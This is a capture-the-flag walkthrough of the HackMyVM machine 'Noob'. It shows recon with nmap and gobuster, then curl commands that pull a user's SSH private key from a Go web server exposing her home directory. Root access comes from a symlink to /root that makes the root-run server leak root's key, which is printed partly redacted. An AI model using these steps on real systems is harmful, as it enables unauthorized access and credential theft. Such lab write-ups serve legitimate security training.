# Noob

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Noob | sml | Beginner | HackMyVM |

**Summary:** Noob is a beginner-level Linux machine that demonstrates the dangers of exposing user home directories through misconfigured web services. The attack path begins with discovering a Go-based HTTP server running on a non-standard port (65530) that serves the contents of a user's home directory, including their SSH private key. After gaining initial access as user `adela`, privilege escalation is achieved by exploiting the same web server's ability to follow symbolic links—by creating a symlink to `/root` in the user's home directory, the attacker can access the root user's SSH private key through the web server and obtain full root access.

---

## Reconnaissance

### Network Discovery

The first step is to identify the target machine's IP address on the local network.

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.57 08:00:27:92:52:03 VirtualBox
```

The target VM is located at `192.168.100.57`.

### Port Scanning

A comprehensive Nmap scan reveals the open ports and services running on the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ nmap -sC -sV -p- 192.168.100.57
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 12:54 WIB
Nmap scan report for 192.168.100.57
Host is up (0.0034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 66:6a:8e:22:cd:dd:75:52:a6:0a:46:06:bc:df:53:0f (RSA)
|   256 c2:48:46:33:d4:fa:c0:e7:df:de:54:71:58:89:36:e8 (ECDSA)
|_  256 5e:50:90:71:08:5a:88:62:7e:81:07:c3:9a:c1:c1:c6 (ED25519)
65530/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.80 seconds
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 7.9p1 on Debian 10 (Buster)
- **Port 65530 (HTTP):** A Go-based HTTP server running on an unusual high port, indicating a custom application

### Web Directory Enumeration

Using Gobuster to enumerate directories on the web server reveals interesting paths.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ gobuster dir -u http://192.168.100.57:65530/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.57:65530/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 301) [Size: 106] [--> /%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]
/index                (Status: 200) [Size: 19]
/nt4share             (Status: 301) [Size: 45] [--> /nt4share/]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

**Discovered Paths:**
- `/index` - Returns a hint message
- `/nt4share` - A directory listing (potential file share)

### Web Content Analysis

Checking the `/index` endpoint provides a hint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl -I 192.168.100.57:65530/index
HTTP/1.1 200 OK
Date: Sun, 01 Feb 2026 06:01:07 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl 192.168.100.57:65530/index
Hi, You are close!
```

The `/nt4share/` directory reveals what appears to be a user's home directory:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl -I 192.168.100.57:65530/nt4share/
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Last-Modified: Wed, 14 Jul 2021 06:51:25 GMT
Date: Sun, 01 Feb 2026 06:06:52 GMT
Content-Length: 179

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl 192.168.100.57:65530/nt4share/
<pre>
<a href=".Xauthority">.Xauthority</a>
<a href=".bash_logout">.bash_logout</a>
<a href=".bashrc">.bashrc</a>
<a href=".profile">.profile</a>
<a href=".ssh/">.ssh/</a>
</pre>
```

**Critical Discovery:** The web server is exposing a user's home directory, including the `.ssh/` folder!

---

## Initial Access

### SSH Key Extraction

Exploring the `.ssh/` directory reveals SSH key files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl 192.168.100.57:65530/nt4share/.ssh/
<pre>
<a href="authorized_keys">authorized_keys</a>
<a href="id_rsa">id_rsa</a>
<a href="id_rsa.pub">id_rsa.pub</a>
</pre>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl -I 192.168.100.57:65530/nt4share/.ssh/id_rsa
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 1823
Content-Type: text/plain; charset=utf-8
Last-Modified: Tue, 13 Jul 2021 17:56:49 GMT
Date: Sun, 01 Feb 2026 06:08:09 GMT
```

The private SSH key is accessible! Let's download it:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl -O 192.168.100.57:65530/nt4share/.ssh/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:100  1823 100  1823   0     0 120353     0  --:--:-- --:--:-- --:--:-- 121533

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8ZepdREM4ou+KYXDsFPT9ZzQFF6dbSWuLpN6HFSNMrDcWBRvZp0sAIK8NIMKYmQXOqWToiELuBBkwYePYRrnMiAPQ4bjtgoDw3iZSJArUANN4mkkC63h3KNe8xJ02HD05FaqvVBwUG/1Ggb0i2Py2AAs4J7bITIpIOYCzZ88Zc10unLNKVXkE207E7fAH3wRa/Q/DOA6Mgh7tFhOlKh90FX82Kp/q3yJLyH1gal5z0BF4/039zR2wuFLTUDL1kZCImzEuH01Ls4aFuwwBE1iTR17yBY0z2GLDhNrtyOFGCfylHTGA6KLgfug1yP2khYTskzzrZPunq160IlaoXvNZ adela@noob
```

The public key reveals the username: **adela**

### SSH Login as Adela

Using the stolen private key to authenticate:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ ssh -i id_rsa adela@192.168.100.57
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
...
adela@noob:~$ id
uid=1000(adela) gid=1000(adela) groups=1000(adela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

**Initial access achieved as user `adela`!**

---

## Privilege Escalation

### Enumeration

Standard privilege escalation checks (sudo permissions, SUID binaries) yielded no results. However, analyzing the attack vector provides insight: the web server running on port 65530 is serving the contents of `/home/adela` as the `/nt4share/` directory, and it's running with elevated privileges (likely as root).

### Symlink Attack Theory

If the web server follows symbolic links, we can create a symlink in adela's home directory pointing to `/root`. The web server would then expose root's home directory contents.

### Creating the Symlink

```bash
adela@noob:~$ ln -s /root root
adela@noob:~$ ls -la root
lrwxrwxrwx 1 adela adela 5 Feb  1 01:38 root -> /root
```

### Verifying the Attack

Checking the web server now shows the new symlink:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl http://192.168.100.57:65530/nt4share/
<pre>
<a href=".Xauthority">.Xauthority</a>
<a href=".bash_logout">.bash_logout</a>
<a href=".bashrc">.bashrc</a>
<a href=".profile">.profile</a>
<a href=".ssh/">.ssh/</a>
<a href="root">root</a>
</pre>
```

The symlink appears! Accessing it reveals root's home directory:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl http://192.168.100.57:65530/nt4share/root/
<pre>
<a href=".bashrc">.bashrc</a>
<a href=".local/">.local/</a>
<a href=".profile">.profile</a>
<a href=".selected_editor">.selected_editor</a>
<a href=".ssh/">.ssh/</a>
<a href="root.txt">root.txt</a>
<a href="user.txt">user.txt</a>
</pre>
```

**The attack works!** Both flags and root's SSH directory are now accessible.

### Extracting Root's SSH Key

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl http://192.168.100.57:65530/nt4share/root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
..............................[REDACTED]..............................
T7Qx+xDGFV1hJakGHwAAAAlyb290QG5vb2I=
-----END OPENSSH PRIVATE KEY-----
```

Downloading and verifying the key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ curl http://192.168.100.57:65530/nt4share/root/.ssh/id_rsa -o root_key
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1811 100  1811   0     0 264727     0  --:--:-- --:--:-- --:--:-- 301833

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ ls -la root_key
-rw-r--r-- 1 ouba ouba 1811 Feb  1 13:43 root_key

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ chmod 600 root_key

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ ssh-keygen -y -f root_key
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUUmRLCeUuWNfScjiCxMqt87FiBzlNURmbpijweH8YCsnlxv4KiY+dp7V5u9z169jHYXpRVWDDUfZ8dzdOyJXgS05aUgbNzYrCYprDxgap4G96meDkQ7b4sOzGgAWMVTC9nPFrYK98F91N7MG/pOLF/YyKU9IF0hCkZDGqcUzLpVT7XsmMP3eF5+gv9wqwOT9A5AOvho0w9EeHWQhvT2RGAfdEd9vl9u2rqm1z0uhEIkEFL9OKBAFZCD8NwTps+zLKp8IXJBPBMuD3BtBlRoAa+LfgawVTGFWJ/xbPb7hAqE58lqNj7ih+bHdsP8ibcxEWq+tjJUEyKuDi9yhN3KiZ root@noob
```

The key is confirmed as belonging to **root@noob**.

### Root Access

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/noob]
└─$ ssh -i root_key root@192.168.100.57
...
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
...
root@noob:~# id
uid=0(root) gid=0(root) groups=0(root)
root@noob:~# ls -la
total 36
drwx------  4 root root 4096 Jul 13  2021 .
drwxr-xr-x 18 root root 4096 Jul 11  2021 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Jul 13  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   25 Jul 13  2021 root.txt
-rw-r--r--  1 root root   66 Jul 13  2021 .selected_editor
drwx------  2 root root 4096 Jul 13  2021 .ssh
-rw-------  1 root root   25 Jul 13  2021 user.txt
root@noob:~# cat user.txt root.txt
HMVV[REDACTED]
HMVA[REDACTED]
```

**ROOTED!**

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified target at 192.168.100.57; Nmap revealed SSH (22) and a Go HTTP server on port 65530.
2. **Vulnerability Discovery**: Gobuster found `/nt4share/` directory exposing a user's home directory including `.ssh/` folder with private keys.
3. **Exploitation**: Downloaded user `adela`'s private SSH key from the exposed web directory and used it to gain initial shell access.
4. **Internal Enumeration**: Determined that the web server runs as root and follows symbolic links within the served directory.
5. **Privilege Escalation**: Created a symlink in adela's home directory pointing to `/root`, accessed root's `.ssh/id_rsa` through the web server, and used it to SSH as root.
